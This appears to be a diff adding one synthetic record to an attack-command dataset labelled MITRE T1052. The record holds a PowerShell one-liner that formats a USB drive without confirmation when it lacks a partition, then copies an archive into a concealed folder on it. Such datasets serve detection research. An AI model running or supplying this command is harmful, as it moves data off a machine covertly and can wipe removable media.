@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d=(Get-Disk | Where-Object BusType -eq 'USB' | Select-Object -First 1); $p=(Get-Partition -DiskNumber $d.Number | Where-Object DriveLetter | Select-Object -First 1); if(-not $p){ Initialize-Disk -Number $d.Number -PartitionStyle MBR -PassThru | New-Partition -UseMaximumSize -AssignDriveLetter | Format-Volume -FileSystem exFAT -NewFileSystemLabel \"Media\" -Confirm:$false | Out-Null; $p=(Get-Partition -DiskNumber $d.Number | Where-Object DriveLetter | Select-Object -First 1)}; $dl=$p.DriveLetter; Expand-Archive -Path \"C:\\Temp\\snapshot.zip\" -DestinationPath \"$dl:\\.cache\" -Force",
+  "explanation": "Initializes and formats a USB if needed, then extracts a snapshot archive onto a hidden-like directory on the removable media.",
+  "rationale_steps": [
+    "Detect the USB disk and ensure it has a mounted partition.",
+    "If absent, create partition, format, and assign a drive letter.",
+    "Expand a local archive into a concealed folder on the USB."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-5d877001-04928752",
+  "source_prompt_hash": "5d877001",
+  "timestamp_utc": "2025-09-30T05:25:30.107478Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
